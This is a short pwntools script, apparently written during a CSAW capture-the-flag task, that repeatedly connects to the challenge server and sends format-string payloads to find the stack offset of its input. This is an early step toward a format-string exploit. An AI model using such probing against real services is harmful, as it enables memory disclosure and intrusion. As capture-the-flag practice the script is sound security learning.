from pwn import *

def find_offset():
    for i in range(1, 50):
        p = remote("pwn.chal.csaw.io", 8000)
        p.recvuntil(b"GOT milk? ")
        payload = b"AAAA" + b" %%%d$08x" % i
        p.sendline(payload)
        response = p.recvall(timeout=2).decode(errors='ignore')
        if "41414141" in response:
            print(f"Offset found: {i}")
            print(f"Response: {response}")
            p.close()
            return i
        p.close()
    print("Offset not found")
    return None

if __name__ == "__main__":
    find_offset()
end_of_edit

